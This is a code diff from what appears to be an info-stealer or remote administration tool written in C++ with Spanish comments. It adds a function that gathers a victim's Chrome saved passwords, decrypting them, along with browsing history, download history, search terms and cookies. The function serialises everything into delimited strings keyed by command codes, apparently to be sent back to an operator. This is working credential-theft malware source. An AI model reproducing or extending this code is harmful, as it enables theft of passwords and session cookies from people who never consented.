@@ -343,8 +343,11 @@ std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& s
 				if (item[0].size() > 0 && item[1].size() > 0 && item[2].size() > 0 && item[3].size() > 0) {
 					Chrome_Login_Data nPassword;
 					nPassword.strUrl      = item[0];
+					if (nPassword.strUrl == "") { nPassword.strUrl = "-"; }
 					nPassword.strAction   = item[1];
+					if (nPassword.strAction == "") { nPassword.strAction = "-"; }
 					nPassword.strUser     = item[2];
+					if (nPassword.strUser == "") { nPassword.strUser = "-"; }
 					nPassword.strPassword = this->m_DecryptData(item[3]);
 					
 					vcOut.push_back(nPassword);
@@ -456,6 +459,92 @@ std::vector<Chrome_Download_History> mod_Info::m_ProfileDownloadHistory(const st
 		}
 	}
 	return vcOut;
+}
+
+std::string mod_Info::m_GetProfileData(const std::string& strPath, const char cOption) {
+	std::string strOut = "";
+	strOut.append(1, cOption);
+	strOut.append(1, CMD_DEL);
+
+	switch (cOption){
+		case '1':
+			//Passwords
+			for (Chrome_Login_Data& login_data : this->m_ProfilePasswords(strPath)) {
+				strOut += login_data.strUrl;
+				strOut += ":[<->]:";
+				strOut += login_data.strAction;
+				strOut += ":[<->]:";
+				strOut += login_data.strUser;
+				strOut += ":[<->]:";
+				strOut += login_data.strPassword;
+				strOut += ":[<>]:";
+			}
+			break;
+		case '2':
+			//historial navegacion
+			for (Chrome_History& history_data : this->m_ProfileBrowsingHistory(strPath)) {
+				strOut += history_data.strURL;
+				strOut += ":[<->]:";
+				strOut += history_data.strTitle;
+				strOut += ":[<->]:";
+				strOut += history_data.strVisitCount;
+				strOut += ":[<->]:";
+				strOut += history_data.strLastVisitTime;
+				strOut += ":[<>]:";
+			}
+			break;
+		case '3':
+			//Historial descargas
+			for (Chrome_Download_History& history_down_data : this->m_ProfileDownloadHistory(strPath)) {
+				strOut += history_down_data.strTargetPath;
+				strOut += ":[<->]:";
+				strOut += history_down_data.strStartTime;
+				strOut += ":[<->]:";
+				strOut += history_down_data.strTotalBytes;
+				strOut += ":[<->]:";
+				strOut += history_down_data.strTabURL;
+				strOut += ":[<->]:";
+				strOut += history_down_data.strMimeType;
+				strOut += ":[<>]:";
+			}
+			break;
+		case '4':
+			//Historial busquedas
+			for (Chrome_Search_Terms history_search : this->m_ProfileSearchTerms(strPath)) {
+				strOut += history_search.strTerm;
+				strOut += ":[<>]:";
+			}
+			break;
+		case '5':
+			//Cookies
+			for (Cookie& cookie_data : this->m_ProfileCookies(strPath)) {
+				strOut += cookie_data.strCreationUTC;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strHostKey;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strName;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strValue;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strPath;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strExpiresUTC;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strLastAccessUTC;
+				strOut += ":[<->]:";
+				strOut += cookie_data.strLastUpdateUTC;
+				strOut += ":[<>]:";
+			}
+			break;
+		default:
+			break;
+	}
+
+	if (strOut.size() > 6) {
+		strOut = strOut.substr(0, strOut.size() - 6);
+	}
+
+	return strOut;
 }
 
 std::vector<std::string> mod_Info::m_Usuarios() {
